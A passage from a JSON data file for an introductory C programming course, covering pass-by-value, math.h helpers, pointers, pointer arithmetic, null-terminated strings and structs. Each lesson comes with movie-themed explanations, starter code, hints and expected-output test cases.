keyword indicating that a function returns nothing, or takes no arguments."}],"image":{"url":"/diagrams/c/function-basics.svg","caption":"Function anatomy: prototypes declare signatures up front; definitions provide execution bodies."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Base 10 Multiplier 5","input":"10 5","expected":"Shield Integrity: 50%"},{"name":"Full Shield Recharge 25 x 4","input":"25 4","expected":"Shield Integrity: 100%"},{"name":"Overcharged Boost 40 x 3","input":"40 3","expected":"Shield Integrity: 120%"}],"usesInput":true,"hasHarness":false},{"id":"pass-by-value","number":"3.2","title":"Pass-by-Value: The Photocopier Rule","content":"## The Photocopier Rule\n\nIn the adventure movie *National Treasure*, Benjamin Franklin Gates discovers an ancient parchment map. If he hands a team member a **photocopy** of the map, and that person scribbles notes and draws paths all over it, what happens to the original parchment locked in the museum case?\n\nAbsolutely nothing. The original is untouched.\n\nThis is the golden rule of C function arguments: **C is strictly pass-by-value**.\n\nWhen you pass a variable into a function, C makes a temporary, duplicated photocopy of the value and places it into the function's own isolated memory space (its **stack frame**). Any modifications made inside the function modify only that local copy.\n\n## Witnessing Pass-by-Value in Action\n\nConsider this failed attempt at modifying a variable:\n\n~~~\nvoid bad_damage(int hp) {\n    hp = hp - 20; // Modifies ONLY the local photocopy!\n}\n\nint main(void) {\n    int player_hp = 100;\n    bad_damage(player_hp);\n    // player_hp is STILL 100!\n}\n~~~\n\nTo communicate new results back to the caller in standard C functions, you must **return** the computed value and assign it in ^main^:\n\n~~~\nint apply_damage(int hp, int damage) {\n    return hp - damage;\n}\n\nint main(void) {\n    int player_hp = 100;\n    int damage = 35;\n    int remaining = apply_damage(player_hp, damage);\n    // remaining is now 65!\n}\n~~~\n\n## Predict & Observe\n\nWhat happens to the stack memory of ^apply_damage^ once it finishes executing?\nThe operating system instantly tears down and recycles that entire stack frame. Any local variables created inside the function vanish forever into thin air. Only the returned value survives!\n\n## Your Task\n\nWrite the function:\n^int apply_damage(int hp, int damage);^\nwhich computes and returns ^hp - damage^.\n\nIn ^main^:\n1. Read initial ^hp^ and ^damage^ from standard input.\n2. Call ^apply_damage(hp, damage)^ to calculate remaining HP.\n3. Print:\n~~~\nOriginal HP: <hp>\nDamage Dealt: <damage>\nRemaining HP: <remaining>\n~~~","starter":"#include <stdio.h>\n\n// TODO: Prototype for apply_damage\n\nint main(void) {\n    int hp = 0;\n    int damage = 0;\n\n    // TODO: Read hp and damage from stdin\n    // Compute remaining HP using apply_damage\n    // Print Original HP, Damage Dealt, and Remaining HP\n\n    return 0;\n}\n\n// TODO: Implement apply_damage\n","hint":"In apply_damage(int hp, int damage), return hp - damage; Print the three lines in main exactly matching the prompt.","terms":[{"term":"pass-by-value","def":"The argument-passing mechanism where values are copied; changes inside the callee do not affect caller variables."},{"term":"stack frame","def":"A dedicated block of memory allocated automatically whenever a function is called, storing its local variables."},{"term":"scope","def":"The region of code where a variable is visible and accessible."}],"image":{"url":"/diagrams/c/pass-by-value.svg","caption":"The photocopier rule: functions receive isolated copies of variables on their own stack frame."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Direct Hit: 100 HP minus 35","input":"100 35","expected":"Original HP: 100\nDamage Dealt: 35\nRemaining HP: 65"},{"name":"Boss Battle Strike: 500 HP minus 120","input":"500 120","expected":"Original HP: 500\nDamage Dealt: 120\nRemaining HP: 380"},{"name":"Armor Deflected: 50 HP minus 5","input":"50 5","expected":"Original HP: 50\nDamage Dealt: 5\nRemaining HP: 45"}],"usesInput":true,"hasHarness":false},{"id":"math-helpers","number":"3.3","title":"Math Helpers: Avengers Trajectory Calculations","content":"## Flight Diagnostics with JARVIS\n\nWhen Tony Stark steps into the Mark VII Iron Man suit, JARVIS runs millions of flight calculations every second: calculating Euclidean radar distances to enemy Chitauri vessels, and calibrating the exact kinetic energy of repulsor blasts.\n\nStandard C includes a comprehensive library of hardware-accelerated mathematical functions in ^<math.h>^.\n\n## Key <math.h> Helpers\n\n- ^sqrt(x)^ - Computes the square root of a double: ^sqrt(25.0) == 5.0^.\n- ^pow(base, exp)^ - Computes base raised to the power of exp: ^pow(3.0, 2.0) == 9.0^.\n- ^fabs(x)^ - Absolute value of a floating-point number.\n\n## Formulas\n\n1. **2D Euclidean Distance**:\n   $$\\text{distance} = \\sqrt{(x_2 - x_1)^2 + (y_2 - y_1)^2}$$\n   In C: ^sqrt(pow(x2 - x1, 2) + pow(y2 - y1, 2))^\n\n2. **Kinetic Energy**:\n   $$\\text{KE} = \\frac{1}{2} \\cdot \\text{mass} \\cdot \\text{velocity}^2$$\n   In C: ^0.5 * mass * pow(velocity, 2)^\n\n## Predict & Observe\n\nWhy must we link with ^-lm^ in gcc when compiling math programs?\nIn Unix and Linux systems, math functions are kept in a separate library archive named ^libm^. The ^-lm^ flag tells the linker to fuse the hardware floating-point math routines into your final executable!\n\n## Your Task\n\nImplement two functions:\n1. ^double calculate_distance(double x1, double y1, double x2, double y2);^\n2. ^double kinetic_energy(double mass, double velocity);^\n\nIn ^main^:\nRead 6 doubles from standard input: ^x1 y1 x2 y2 mass velocity^.\nCall your helper functions and print:\n~~~\nDistance: <dist> km\nKinetic Energy: <ke> Joules\n~~~\nFormat both outputs to 2 decimal places (^%.2f^).","starter":"#include <stdio.h>\n#include <math.h>\n\n// TODO: Write prototypes for calculate_distance and kinetic_energy\n\nint main(void) {\n    double x1 = 0, y1 = 0, x2 = 0, y2 = 0, mass = 0, velocity = 0;\n\n    // TODO: Read 6 doubles using scanf(\"%lf %lf %lf %lf %lf %lf\", ...)\n    // Print Distance: %.2f km\n    // Print Kinetic Energy: %.2f Joules\n\n    return 0;\n}\n\n// TODO: Implement calculate_distance and kinetic_energy\n","hint":"Include <math.h>. Use %lf in scanf to read double values. In calculate_distance use sqrt(pow(x2 - x1, 2) + pow(y2 - y1, 2)).","terms":[{"term":"<math.h>","def":"Standard C library header containing mathematical declarations such as sqrt, pow, sin, cos, and log."},{"term":"sqrt()","def":"A function that returns the non-negative square root of a non-negative floating-point number."},{"term":"pow()","def":"A function that raises a floating-point base number to a specified floating-point exponent."},{"term":"double","def":"A double-precision 64-bit floating point data type providing ~15 to 17 decimal digits of precision."},{"term":"-lm","def":"The compiler linker flag that binds the standard system math library (libm) into the binary."}],"image":{"url":"/diagrams/c/math-helpers.svg","caption":"Linking <math.h> for hardware-accelerated square roots and exponential powers."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Classic 3-4-5 Triangle Trajectory","input":"0.0 0.0 3.0 4.0 10.0 20.0","expected":"Distance: 5.00 km\nKinetic Energy: 2000.00 Joules"},{"name":"High Velocity Projectile","input":"10.0 20.0 16.0 28.0 2.5 100.0","expected":"Distance: 10.00 km\nKinetic Energy: 12500.00 Joules"}],"usesInput":true,"hasHarness":false},{"id":"unit-3-test","number":"3.4","title":"Unit 3 Test: Superhero Power Level Analyzer","content":"## Mission Briefing: Avengers Threat Assessment\n\nNick Fury and S.H.I.E.L.D. need a certified tactical analyzer to grade emerging superhumans into threat tiers before assembling the next Avengers roster.\n\nIn this Unit 3 Test, you will demonstrate mastery of modular C software design:\n- Splitting tasks into clean, single-responsibility functions.\n- Defining precise function prototypes.\n- Mathematical weighting calculations.\n- Multi-tier conditional evaluation.\n\n## Required Functions\n\nYou must declare prototypes and implement three functions:\n\n1. ^double calculate_threat(int strength, int speed, int intellect);^\n   Computes and returns the weighted threat index:\n   $$\\text{threat} = (\\text{strength} \\times 1.5) + (\\text{speed} \\times 1.2) + (\\text{intellect} \\times 2.0)$$\n\n2. ^char classify_tier(double threat);^\n   Evaluates the threat index and returns an ASCII tier letter:\n   - If ^threat >= 100.0^ &rarr; return ^'S'^ (Cosmic / Omega Level)\n   - Else if ^threat >= 75.0^ &rarr; return ^'A'^ (Global Avenger)\n   - Else if ^threat >= 50.0^ &rarr; return ^'B'^ (City Defender)\n   - Else &rarr; return ^'C'^ (Local Vigilante)\n\n3. ^void print_hero_dossier(int strength, int speed, int intellect);^\n   Calls ^calculate_threat^ and ^classify_tier^, then prints the formatted dossier:\n   ~~~\n   --- HERO DOSSIER ---\n   Stats: STR <strength> | SPD <speed> | INT <intellect>\n   Threat Index: <threat>\n   Rank: Tier <tier>\n   ~~~\n   Format the ^Threat Index^ to 1 decimal place (^%.1f^).\n\n## Main Program\n\nInside ^main^, read three integers from standard input:\n^strength speed intellect^\nand call ^print_hero_dossier(strength, speed, intellect);^.\n\n## Example\n\nInput:\n~~~\n30 25 35\n~~~\n\nCalculation:\n$$\\text{threat} = (30 \\times 1.5) + (25 \\times 1.2) + (35 \\times 2.0) = 45.0 + 30.0 + 70.0 = 145.0$$\n$$\\text{tier} = \\text{'S'}$$\n\nOutput:\n~~~\n--- HERO DOSSIER ---\nStats: STR 30 | SPD 25 | INT 35\nThreat Index: 145.0\nRank: Tier S\n~~~","starter":"#include <stdio.h>\n\n// TODO: Prototypes for calculate_threat, classify_tier, and print_hero_dossier\n\nint main(void) {\n    int str = 0, spd = 0, intel = 0;\n\n    // TODO: Read str, spd, intel from stdin and call print_hero_dossier\n\n    return 0;\n}\n\n// TODO: Implement calculate_threat, classify_tier, and print_hero_dossier\n","hint":"In calculate_threat, return (strength * 1.5) + (speed * 1.2) + (intellect * 2.0). In classify_tier check >= 100 for S, >= 75 for A, >= 50 for B, else C.","terms":[{"term":"modular design","def":"Structuring software as separate, interchangeable subroutines that each handle one specific sub-problem."},{"term":"single responsibility","def":"The programming principle that each function should do one thing and do it well."},{"term":"weighted calculation","def":"A formula where different variables contribute according to assigned importance multipliers."}],"image":{"url":"/diagrams/c/unit-3-test.svg","caption":"The complete Avengers Threat Matrix modular function suite."},"isUnitTest":true,"fileName":"main.c","tests":[{"name":"Omega Level Champion (Tier S)","input":"30 25 35","expected":"--- HERO DOSSIER ---\nStats: STR 30 | SPD 25 | INT 35\nThreat Index: 145.0\nRank: Tier S"},{"name":"Global Defender (Tier A)","input":"20 15 20","expected":"--- HERO DOSSIER ---\nStats: STR 20 | SPD 15 | INT 20\nThreat Index: 88.0\nRank: Tier A"},{"name":"City Patrol Hero (Tier B)","input":"15 15 10","expected":"--- HERO DOSSIER ---\nStats: STR 15 | SPD 15 | INT 10\nThreat Index: 60.5\nRank: Tier B"},{"name":"Local Street Vigilante (Tier C)","input":"10 10 10","expected":"--- HERO DOSSIER ---\nStats: STR 10 | SPD 10 | INT 10\nThreat Index: 47.0\nRank: Tier C"}],"usesInput":true,"hasHarness":false}]},{"id":"pointers","title":"Pointers & Memory Addresses","lessons":[{"id":"pointer-intro","number":"4.1","title":"Pointers: Street Addresses of the RAM City","content":"## Street Addresses of the RAM City\n\nImagine a city where every single house along a massive boulevard has a unique, sequential street address: 1000, 1004, 1008...\nIn Sherlock Holmes, or on Harry Potter's *Marauder's Map*, knowing someone's exact street address gives you the power to find them, inspect what is inside their house, and even change what is in the living room without moving the house an inch.\n\nYour computer's RAM is that city.\nA **variable** is the house.\nThe **value** is what is stored inside the house.\nThe **memory address** is the street address where that house was built.\n\nA **pointer** is a special variable whose entire purpose in life is to hold the **memory address** of another variable!\n\n## The Two Master Operators\n\n1. **Address-of operator (^&^)**: Retrieves the memory address of a variable.\n   ~~~\n   int secret = 1337;\n   int *ptr = &secret; // ptr now holds the memory address of secret\n   ~~~\n   The asterisk in ^int *ptr^ indicates: *\"ptr is a pointer to an integer\"*.\n\n2. **Dereference operator (^*^)**: Follows the pointer's stored address down to the actual target house, letting you read or modify its contents!\n   ~~~\n   printf(\"Value: %d\\n\", *ptr); // Reads what is inside secret (1337)\n   *ptr = 2048;                 // Overwrites the living room! secret is now 2048!\n   ~~~\n\n## Predict & Observe\n\nWhat is the difference between ^ptr^ and ^*ptr^?\n- ^ptr^ is the raw street address (e.g. ^0x7ffee4^). If you print ^ptr^ with ^%p^, you see hexadecimal memory coordinates.\n- ^*ptr^ dereferences the address and grabs the actual integer stored at that address (^1337^).\n\n## Your Task\n\n1. Declare an integer variable ^secret^ initialized to ^1337^.\n2. Declare an integer pointer ^ptr^ initialized to the address of ^secret^ (^&secret^).\n3. Print the value of ^secret^ using the dereferenced pointer:\n   ^Initial Value: <*ptr>^\n4. Mutate ^secret^ **only** through the pointer by setting ^*ptr = 2048;^.\n5. Print the variable ^secret^ directly:\n   ^Updated Value: <secret>^\n6. Print the value through ^*ptr^ once more to verify:\n   ^Direct Verification: <*ptr>^","starter":"#include <stdio.h>\n\nint main(void) {\n    // TODO:\n    // 1. Declare int secret = 1337;\n    // 2. Declare int *ptr = &secret;\n    // 3. Print Initial Value: %d\\n using *ptr\n    // 4. Update via *ptr = 2048;\n    // 5. Print Updated Value: %d\\n using secret\n    // 6. Print Direct Verification: %d\\n using *ptr\n\n    return 0;\n}\n","hint":"Declare int secret = 1337; int *ptr = &secret; Then print *ptr, set *ptr = 2048, and print secret and *ptr.","terms":[{"term":"pointer","def":"A variable that holds the memory address of another variable rather than holding raw data directly."},{"term":"address-of operator (&)","def":"An operator placed before a variable name that returns its physical memory address in RAM."},{"term":"dereference operator (*)","def":"An operator placed before a pointer variable that accesses or modifies the value at the target memory address."},{"term":"RAM (Random Access Memory)","def":"The computer hardware where active program variables and instructions are temporarily stored."}],"image":{"url":"/diagrams/c/pointer-intro.svg","caption":"Pointers store the street addresses of RAM cells; dereferencing (*ptr) follows the address to read or write contents."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Pointer Address Mutation Sequence","input":"","expected":"Initial Value: 1337\nUpdated Value: 2048\nDirect Verification: 2048"}],"usesInput":false,"hasHarness":false},{"id":"pointer-mutation","number":"4.2","title":"Pointer Mutation: Handing Over the Keys","content":"## The Body-Swap Comedy\n\nIn the classic body-swap movie *Freaky Friday*, a mysterious fortune cookie causes mother and daughter to wake up with their identities completely swapped.\n\nIn Unit 3, we learned that C is strictly pass-by-value: functions get photocopies and cannot mutate your original variables. But what if you **hand the function the keys to your house**?\n\nBy passing a variable's **memory address** (^&a^) to a function that accepts a **pointer parameter** (^int *a^), that function can reach back into the caller's stack frame and mutate the original variable directly!\n\n## The Canonical Swap Function\n\n~~~\nvoid swap(int *x, int *y) {\n    int temp = *x; // 1. Save value at address x\n    *x = *y;       // 2. Overwrite address x with value at y\n    *y = temp;     // 3. Overwrite address y with saved temp\n}\n\nint main(void) {\n    int a = 10, b = 20;\n    swap(&a, &b);  // We pass addresses (&), not values!\n    // a is now 20, b is now 10!\n}\n~~~\n\nNotice how ^swap(&a, &b)^ gives ^swap^ the memory coordinates of ^a^ and ^b^. Dereferencing them with ^*x^ and ^*y^ modifies the original memory in ^main^.\n\n## Predict & Observe\n\nWhat happens if you accidentally write ^x = y;^ inside ^swap^ without the asterisks?\nYou will simply reassign the local pointer parameter to point to the other address! The actual numbers in ^a^ and ^b^ inside ^main^ will remain completely unchanged. Always dereference with ^*^ to change the underlying value.\n\n## Your Task\n\nImplement two functions:\n1. ^void swap_inventory(int *itemA, int *itemB);^\n   Swaps the values stored at the two pointers.\n2. ^void apply_boost(int *stat, int multiplier);^\n   Multiplies the value stored at ^*stat^ by ^multiplier^.\n\nIn ^main^:\n1. Read three integers from standard input: ^a^, ^b^, and ^boost^.\n2. Print: ^Initial: A=<a\\>, B=<b\\>^\n3. Call ^swap_inventory(&a, &b);^\n4. Print: ^After Swap: A=<a\\>, B=<b\\>^\n5. Call ^apply_boost(&a, boost);^\n6. Print: ^After Boost: A=<a\\>, B=<b\\>^","starter":"#include <stdio.h>\n\n// TODO: Prototypes for swap_inventory and apply_boost\n\nint main(void) {\n    int a = 0, b = 0, boost = 0;\n\n    // TODO: Read a, b, boost from stdin\n    // Print Initial state\n    // Call swap_inventory(&a, &b)\n    // Print After Swap state\n    // Call apply_boost(&a, boost)\n    // Print After Boost state\n\n    return 0;\n}\n\n// TODO: Implement swap_inventory and apply_boost\n","hint":"In swap_inventory, use int temp = *itemA; *itemA = *itemB; *itemB = temp; Remember to pass &a and &b when calling.","terms":[{"term":"pass-by-reference","def":"Simulating reference semantics in C by explicitly passing memory addresses via pointers."},{"term":"in-place mutation","def":"Modifying data directly in its existing memory location without allocating new storage."},{"term":"swap algorithm","def":"A 3-step routine using a temporary variable to exchange the values stored at two addresses."}],"image":{"url":"/diagrams/c/pointer-mutation.svg","caption":"Passing memory addresses gives foreign functions the keys to mutate caller variables in place."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Item Swap and Stat 3x Boost","input":"10 25 3","expected":"Initial: A=10, B=25\nAfter Swap: A=25, B=10\nAfter Boost: A=75, B=10"},{"name":"Hero Stat Rebalance with 5x Boost","input":"100 500 5","expected":"Initial: A=100, B=500\nAfter Swap: A=500, B=100\nAfter Boost: A=2500, B=100"}],"usesInput":true,"hasHarness":false},{"id":"pointer-arrays","number":"4.3","title":"Pointers and Arrays: Twin Siblings of C","content":"## Train Cars Linked on a Track\n\nPicture a high-speed passenger train: each train car is coupled sequentially to the one before it. If you know where train car #0 is parked on the tracks, you can walk forward car-by-car simply by taking steps down the platform.\n\nIn C, arrays and pointers are virtually twin siblings:\nWhenever an array name appears in an expression, it automatically **decays** into a pointer pointing directly to its first element (^&arr[0]^).\n\nIn fact, the bracket index notation ^arr[i]^ is nothing more than syntactic sugar for pointer arithmetic:\n\n$$\\text{arr}[i] \\equiv *(\\text{arr} + i)$$\n\n## Pointer Arithmetic\n\nWhen you add ^1^ to a pointer in C (^ptr + 1^), C does **not** add 1 single byte. C automatically multiplies the step by ^sizeof(*ptr)^!\n- For an ^int^ (4 bytes), ^ptr + 1^ moves forward 4 bytes to the very next integer.\n- For a ^double^ (8 bytes), ^ptr + 1^ moves forward 8 bytes.\n\nLook at how you can traverse an entire array using a walking pointer:\n\n~~~\nint numbers[4] = {10, 20, 30, 40};\nint *ptr = numbers; // points to &numbers[0]\n\nfor (int i = 0; i < 4; i++) {\n    printf(\"%d \", *ptr);\n    ptr++; // advances pointer to next element!\n}\n~~~\n\nOutput: ^10 20 30 40 ^\n\n## Predict & Observe\n\nWhat happens if you step a pointer past the end of the array and attempt to dereference it (^*(arr + 100)^)?\nC has no bounds-checking. The CPU will dutifully read whatever random garbage or other program's memory happens to reside at that address, leading to undefined behavior or crash!\n\n## Your Task\n\nRead an integer ^n^ (number of elements, up to 20), followed by ^n^ integers into an array ^arr^.\nUsing **pointer arithmetic** (walking a pointer with ^*ptr^ and ^ptr++^, without using bracket indexing ^arr[i]^ in your calculation loops):\n1. Compute the ^sum^ of all elements.\n2. Find the ^max^ element in the array.\n\nPrint:\n~~~\nArray Traversed via Pointers\nSum: <sum>\nMax: <max>\n~~~","starter":"#include <stdio.h>\n\nint main(void) {\n    int n = 0;\n    int arr[20];\n\n    // TODO: Read n, then read n integers into arr\n    // Traverse arr using a walking pointer (int *ptr = arr;)\n    // Calculate sum and max\n    // Print:\n    // Array Traversed via Pointers\n    // Sum: <sum>\n    // Max: <max>\n\n    return 0;\n}\n","hint":"Initialize int *ptr = arr; int sum = 0; int max = *ptr; Inside the loop, read *ptr, update sum and max, then ptr++;","terms":[{"term":"array decay","def":"The automatic conversion of an array name into a pointer to its first element."},{"term":"pointer arithmetic","def":"Performing addition or subtraction on memory addresses, automatically scaled by element byte size."},{"term":"*(arr + i)","def":"The foundational pointer dereferencing expression equivalent to arr[i]."},{"term":"contiguous memory","def":"A memory layout where elements are positioned consecutively side-by-side without gaps."}],"image":{"url":"/diagrams/c/pointer-arrays.svg","caption":"Array decay and pointer arithmetic: arr[i] is syntactically equivalent to *(arr + i)."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Five Element Integer Array","input":"5\n10 25 5 40 15","expected":"Array Traversed via Pointers\nSum: 95\nMax: 40"},{"name":"Three Element Traversal","input":"3\n100 200 50","expected":"Array Traversed via Pointers\nSum: 350\nMax: 200"},{"name":"Single Element Array","input":"1\n42","expected":"Array Traversed via Pointers\nSum: 42\nMax: 42"}],"usesInput":true,"hasHarness":false},{"id":"unit-4-test","number":"4.4","title":"Unit 4 Test: Secret Agent Cipher Decryption","content":"## Mission Briefing: Operation Enigma\n\nYou are on covert assignment for the agency (think James Bond 007 meets the Bletchley Park crypto-analysts). An intercepted field transmission contains an encrypted buffer of integer signals.\n\nThe cipher employs a two-stage in-place scrambling protocol:\n1. The memory buffer has been **reversed**.\n2. Each integer in the buffer has been shifted forward by an encryption **key offset**.\n\nTo decrypt this message without triggering memory surveillance alarms, the agency demands that all operations be performed **in-place using pure pointer arithmetic**—no bracket indexing (^arr[i]^) and no secondary buffers.\n\n## Technical Specifications\n\nDeclare and implement two pointer functions:\n\n1. ^void reverse_buffer(int *start, int len);^\n   Reverses the buffer in-place using two converging pointers:\n   - ^int *left = start;^\n   - ^int *right = start + len - 1;^\n   - While ^left < right^: swap the integers at ^*left^ and ^*right^, increment ^left++^, and decrement ^right--^.\n\n2. ^void apply_cipher_offset(int *start, int len, int key);^\n   Using a walking pointer from ^start^ up to ^start + len^:\n   - Subtract ^key^ from each integer: ^*curr -= key;^\n\n## Main Program\n\nInside ^main^:\n1. Read ^len^ (number of integers) and ^key^ (offset integer) from standard input.\n2. Read the ^len^ scrambled integers into an array ^buffer[20]^.\n3. Call ^reverse_buffer(buffer, len);^.\n4. Call ^apply_cipher_offset(buffer, len, key);^.\n5. Print the decrypted sequence on one line:\n   ^Decrypted: <val1> <val2> ... <valN>^\n   (With a trailing space after the last number, followed by a newline).\n\n## Example\n\nInput:\n~~~\n5 10\n60 50 40 30 20\n~~~\n\nExecution:\n1. In-place reversal: ^20 30 40 50 60^\n2. Apply offset (-10): ^10 20 30 40 50^\n\nOutput:\n~~~\nDecrypted: 10 20 30 40 50\n~~~","starter":"#include <stdio.h>\n\n// TODO: Prototypes for reverse_buffer and apply_cipher_offset\n\nint main(void) {\n    int len = 0, key = 0;\n    int buffer[20];\n\n    // TODO: Read len and key from stdin\n    // Read len integers into buffer\n    // Call reverse_buffer(buffer, len)\n    // Call apply_cipher_offset(buffer, len, key)\n    // Print Decrypted: followed by each number and a newline\n\n    return 0;\n}\n\n// TODO: Implement reverse_buffer and apply_cipher_offset using pointers\n","hint":"In reverse_buffer, use int *left = start; int *right = start + len - 1; while (left < right) { int t = *left; *left = *right; *right = t; left++; right--; }","terms":[{"term":"two-pointer technique","def":"An algorithm using two pointer variables moving towards or away from each other to process arrays in place."},{"term":"in-place algorithm","def":"An algorithm that transforms input without using any extra memory proportional to the input size."},{"term":"cipher offset","def":"A constant numeric value added to or subtracted from data to encode or decode its meaning."}],"image":{"url":"/diagrams/c/unit-4-test.svg","caption":"In-place secret cipher decryption using converging two-pointer array reversal and pointer arithmetic offsets."},"isUnitTest":true,"fileName":"main.c","tests":[{"name":"Transmission 1: Five Values Key 10","input":"5 10\n60 50 40 30 20","expected":"Decrypted: 10 20 30 40 50 "},{"name":"Transmission 2: Four Values Key 7","input":"4 7\n47 37 27 17","expected":"Decrypted: 10 20 30 40 "},{"name":"Transmission 3: Zero Key Offset","input":"3 0\n99 88 77","expected":"Decrypted: 77 88 99 "}],"usesInput":true,"hasHarness":false}]},{"id":"structs-strings","title":"Structs, Strings & Capstone","lessons":[{"id":"c-strings","number":"5.1","title":"C Strings: The Null-Terminated Whispers","content":"## Morse Code in the Dark\n\nIn *Stranger Things*, Will Byers communicates from the Upside Down using Christmas tree light bulbs blinking Morse code messages across the wall. Every message has to have a designated silent pause—a clear stopping signal—so Joyce knows where the sentence ends.\n\nIn languages like Python or JavaScript, strings are high-level objects with built-in length tracking. In C, **there is no string data type**.\n\nA \"string\" in C is simply an array of ^char^ bytes where the final character is the **null terminator** (^'\\0'^, ASCII value 0).\n\n## The Sentinel Null Byte\n\n~~~\nchar pass[] = \"VOYAGER\";\n~~~\n\nIn memory, this creates 8 contiguous bytes:\n^'V', 'O', 'Y', 'A', 'G', 'E', 'R', '\\0'^\n\nThe ^'\\0'^ acts as a stop light. Every standard C string function in ^<string.h>^—including ^strlen^ (count length), ^strcpy^ (copy string), and ^strcmp^ (compare strings)—starts at index 0 and marches forward byte-by-byte until it strikes ^'\\0'^!\n\n## Comparing Strings with strcmp\n\nBecause a string is an array pointer, writing ^if (input == \"VOYAGER\")^ compares the **memory addresses**, not the text!\nTo compare the actual characters, use ^strcmp^:\n\n~~~\n#include <string.h>\n\nif (strcmp(input, \"VOYAGER\") == 0) {\n    // strcmp returns 0 when strings match identically!\n}\n~~~\n\n## Predict & Observe\n\nWhat happens if a character array has no ^'\\0'^ at the end?\nFunctions like ^printf(\"%s\", str)^ and ^strlen(str)^ will keep reading straight past the end of your buffer, traversing random RAM until they stumble upon an accidental zero byte somewhere in memory. This is called a **buffer overrun** and is one of the most famous security vulnerabilities in history.\n\n## Your Task\n\nRead a string ^passcode^ from standard input (up to 30 characters).\n1. Using a walking pointer (^const char *ptr = passcode;^), count the string length manually until ^*ptr == '\\0'^.\n2. Using ^strcmp^ from ^<string.h>^, check if ^passcode^ matches ^\"VOYAGER\"^.\n3. Print:\n   ^Length: <len>^\n   If matched:\n   ^Access Granted: Mission Log Unlocked^\n   If not matched:\n   ^Access Denied: Invalid Passcode^","starter":"#include <stdio.h>\n#include <string.h>\n\nint main(void) {\n    char passcode[32];\n\n    // TODO: Read passcode with scanf(\"%s\", passcode)\n    // Count length manually with a walking pointer until '\\0'\n    // Compare with \"VOYAGER\" using strcmp\n    // Print:\n    // Length: <len>\n    // Access Granted: Mission Log Unlocked OR Access Denied: Invalid Passcode\n\n    return 0;\n}\n","hint":"Walk pointer with while (*ptr != '\\0') { len++; ptr++; } and use if (strcmp(passcode, \"VOYAGER\") == 0) for matching.","terms":[{"term":"null terminator (\\0)","def":"A special byte with numeric value 0 used to mark the end of a character sequence in C."},{"term":"c-string","def":"A contiguous array of characters ending with a null byte (\\0)."},{"term":"strcmp()","def":"Standard library function that compares two strings lexicographically, returning 0 if they match."},{"term":"<string.h>","def":"Standard header containing string manipulation functions including strlen, strcmp, and strcpy."},{"term":"buffer overrun","def":"An anomaly where software reads or writes past the allocated boundary of a buffer."}],"image":{"url":"/diagrams/c/c-strings.svg","caption":"C strings are arrays of characters ending with a null terminator character ('\\0')."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Correct Passcode: VOYAGER","input":"VOYAGER","expected":"Length: 7\nAccess Granted: Mission Log Unlocked"},{"name":"Incorrect Passcode: APOLLO","input":"APOLLO","expected":"Length: 6\nAccess Denied: Invalid Passcode"},{"name":"Long Incorrect Passcode: ENTERPRISE","input":"ENTERPRISE","expected":"Length: 10\nAccess Denied: Invalid Passcode"}],"usesInput":true,"hasHarness":false},{"id":"struct-basics","number":"5.2","title":"Structs: Assembling Custom Blueprints","content":"## Pokémon Stat Cards & Character Sheets\n\nThink of a *Pokémon* card or a *Dungeons & Dragons* character sheet: you don't keep the monster's name, hit points, attack power, and defense rating in four disconnected scraps of paper scattered across the table. They are bound together on a single unified card.\n\nIn C, a **struct** (short for structure) is a user-defined datatype that lets you combine several variables of different types into a single named record.\n\n## Defining and Accessing Structs\n\n~~~\nstruct Character {\n    char name[30];\n    int hp;\n    int attack;\n    int defense;\n};\n~~~\n\nTo create an instance and access its fields, use the **dot operator** (^.^):\n\n~~~\nstruct Character hero;\nhero.hp = 100;\nhero.attack = 45;\nhero.defense = 20;\n\nprintf(\"Hero HP: %d\\n\", hero.hp);\n~~~\n\nIn physical memory, C packs all four fields together in one single, continuous block of bytes on the stack.\n\n## Predict & Observe\n\nWhat happens if you assign one struct directly to another (^struct Character clone = hero;^)?\nUnlike arrays, C **will** copy the entire struct byte-for-byte! Every field inside ^hero^ is duplicated into ^clone^.\n\n## Your Task\n\nDefine the ^struct Character^:\n~~~\nstruct Character {\n    char name[30];\n    int hp;\n    int attack;\n    int defense;\n};\n~~~\n\nIn ^main^:\n1. Declare two instances: ^struct Character attacker;^ and ^struct Character defender;^.\n2. Read the attacker's stats from stdin: ^name hp attack defense^.\n3. Read the defender's stats from stdin: ^name hp attack defense^.\n4. Calculate battle damage:\n   ^damage = attacker.attack - defender.defense^\n   (If ^damage < 1^, set ^damage = 1^).\n5. Apply damage to defender:\n   ^defender.hp -= damage;^\n   (If ^defender.hp < 0^, set ^defender.hp = 0^).\n6. Print the battle round summary:\n~~~\nBattle Round: <attacker.name> vs <defender.name>\nDamage Dealt: <damage>\n<defender.name> Remaining HP: <defender.hp>\n~~~","starter":"#include <stdio.h>\n\n// TODO: Define struct Character with name[30], hp, attack, defense\n\nint main(void) {\n    // TODO:\n    // Declare attacker and defender structs\n    // Read stats using scanf(\"%s %d %d %d\", ...)\n    // Calculate damage = attacker.attack - defender.defense (min 1)\n    // Reduce defender.hp (min 0)\n    // Print battle report\n\n    return 0;\n}\n","hint":"Define struct Character before main. Calculate damage = attacker.attack - defender.defense. If < 1 set to 1. Reduce defender.hp.","terms":[{"term":"struct","def":"A user-defined composite data type grouping multiple variables under a single name."},{"term":"member / field","def":"An individual variable declared inside a struct definition."},{"term":"dot operator (.)","def":"Operator used to access or assign members of a direct struct instance."},{"term":"composite type","def":"A data type composed of multiple smaller primitive types."}],"image":{"url":"/diagrams/c/struct-basics.svg","caption":"Defining custom data structures with struct and accessing members with the dot (.) operator."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Pikachu vs Charmander","input":"Pikachu 100 45 20\nCharmander 90 40 15","expected":"Battle Round: Pikachu vs Charmander\nDamage Dealt: 30\nCharmander Remaining HP: 60"},{"name":"Mewtwo Overwhelming Strike","input":"Mewtwo 200 120 80\nGengar 80 70 30","expected":"Battle Round: Mewtwo vs Gengar\nDamage Dealt: 90\nGengar Remaining HP: 0"},{"name":"Heavy Armor Absorbs Hit (Minimum 1 Damage)","input":"Rook 100 20 50\nGolem 150 15 60","expected":"Battle Round: Rook vs Golem\nDamage Dealt: 1\nGolem Remaining HP: 